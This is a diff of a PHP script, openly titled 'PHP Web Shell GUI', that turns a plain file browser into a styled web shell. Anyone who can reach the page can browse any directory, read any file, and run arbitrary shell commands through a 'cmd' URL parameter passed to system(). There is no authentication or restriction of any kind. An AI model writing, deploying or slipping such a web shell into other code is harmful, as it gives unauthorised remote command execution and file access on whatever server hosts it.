@@ -1,61 +1,93 @@
 <?php
-$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
-$path = realpath($path);
-
-// Handle "cd" manually for security
-if (!is_dir($path)) {
-    die("Invalid path");
+$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
+if (!$path || !is_dir($path)) {
+    die("Invalid path.");
 }
 
-echo "<h3>📁 Path: ";
+// Command exec
+$output = '';
+if (isset($_GET['cmd'])) {
+    chdir($path);
+    ob_start();
+    system($_GET['cmd']);
+    $output = ob_get_clean();
+}
+
+// CSS UI
+echo <<<HTML
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>🌐 Web Shell GUI</title>
+<style>
+    body { background: #1e1e2f; color: #cfd2dc; font-family: monospace; padding: 20px; }
+    a { color: #61dafb; text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    .path { margin-bottom: 20px; }
+    .box { background: #2c2f4a; padding: 10px; border-radius: 8px; margin-bottom: 10px; }
+    ul { list-style: none; padding: 0; }
+    li { margin: 5px 0; }
+    .folder { color: #f1c40f; }
+    .file { color: #95a5a6; }
+    pre { background: #111; padding: 10px; border-radius: 5px; color: #0f0; overflow: auto; }
+    input[type=text] { width: 60%; padding: 5px; background: #111; color: #0f0; border: 1px solid #555; }
+    input[type=submit] { padding: 5px 10px; background: #333; color: #fff; border: none; cursor: pointer; }
+    h1 { color: #61dafb; }
+</style>
+</head>
+<body>
+<h1>🌐 PHP Web Shell GUI</h1>
+HTML;
+
+// Path navigation
+echo "<div class='path box'><b>📁 Path:</b> ";
 $parts = explode(DIRECTORY_SEPARATOR, $path);
-$full = "";
-foreach ($parts as $i => $part) {
-    if ($part == "") continue;
-    $full .= DIRECTORY_SEPARATOR . $part;
-    echo "<a href='?path=" . urlencode($full) . "'>" . htmlspecialchars($part) . "</a> / ";
+$nav = "";
+foreach ($parts as $i => $p) {
+    if ($p === "") continue;
+    $nav .= DIRECTORY_SEPARATOR . $p;
+    echo "<a href='?path=" . urlencode($nav) . "'>" . htmlspecialchars($p) . "</a> / ";
 }
-echo "</h3>";
+echo "</div>";
 
-// List contents
+// File listing
 $files = scandir($path);
-echo "<ul style='font-family: monospace'>";
+echo "<div class='box'><ul>";
 foreach ($files as $file) {
     if ($file === '.') continue;
-
-    $fullPath = $path . DIRECTORY_SEPARATOR . $file;
-    $link = "?path=" . urlencode($fullPath);
-    
-    if (is_dir($fullPath)) {
-        echo "<li>📁 <a href='$link'>" . htmlspecialchars($file) . "</a></li>";
-    } elseif (is_file($fullPath)) {
-        echo "<li>📄 <a href='?path=" . urlencode($path) . "&view=" . urlencode($file) . "'>" . htmlspecialchars($file) . "</a></li>";
+    $full = $path . DIRECTORY_SEPARATOR . $file;
+    if (is_dir($full)) {
+        echo "<li class='folder'>📁 <a href='?path=" . urlencode($full) . "'>" . htmlspecialchars($file) . "</a></li>";
+    } elseif (is_file($full)) {
+        echo "<li class='file'>📄 <a href='?path=" . urlencode($path) . "&view=" . urlencode($file) . "'>" . htmlspecialchars($file) . "</a></li>";
     }
 }
-echo "</ul>";
+echo "</ul></div>";
 
-// Show file content if clicked
+// File view
 if (isset($_GET['view'])) {
-    $fileToView = $path . DIRECTORY_SEPARATOR . $_GET['view'];
-    if (is_file($fileToView)) {
-        echo "<h4>📄 Viewing: " . htmlspecialchars($_GET['view']) . "</h4>";
-        echo "<pre style='background:#111;color:#0f0;padding:10px;border-radius:8px;'>";
-        echo htmlspecialchars(file_get_contents($fileToView));
-        echo "</pre>";
+    $f = $path . DIRECTORY_SEPARATOR . $_GET['view'];
+    if (is_file($f)) {
+        echo "<div class='box'><b>📄 Viewing:</b> " . htmlspecialchars($_GET['view']) . "<pre>" . htmlspecialchars(file_get_contents($f)) . "</pre></div>";
     }
 }
 
-// Optional: terminal
-echo "<hr><form method='GET'>";
-echo "<input type='hidden' name='path' value='" . htmlspecialchars($path) . "' />";
-echo '<input type="text" name="cmd" placeholder="Shell command" style="width:300px;" />';
-echo '<input type="submit" value="Run" />';
-echo '</form>';
+// Command input
+echo <<<HTML
+<div class="box">
+<form method="GET">
+    <input type="hidden" name="path" value="{$path}" />
+    <input type="text" name="cmd" placeholder="Enter shell command..." />
+    <input type="submit" value="Run" />
+</form>
+</div>
+HTML;
 
-if (isset($_GET['cmd'])) {
-    echo "<pre><b>$ " . htmlspecialchars($_GET['cmd']) . "</b>\n";
-    chdir($path);
-    system($_GET['cmd']);
-    echo "</pre>";
+// Command output
+if ($output) {
+    echo "<div class='box'><b>💻 Output:</b><pre>" . htmlspecialchars($output) . "</pre></div>";
 }
+
+echo "</body></html>";
 ?>
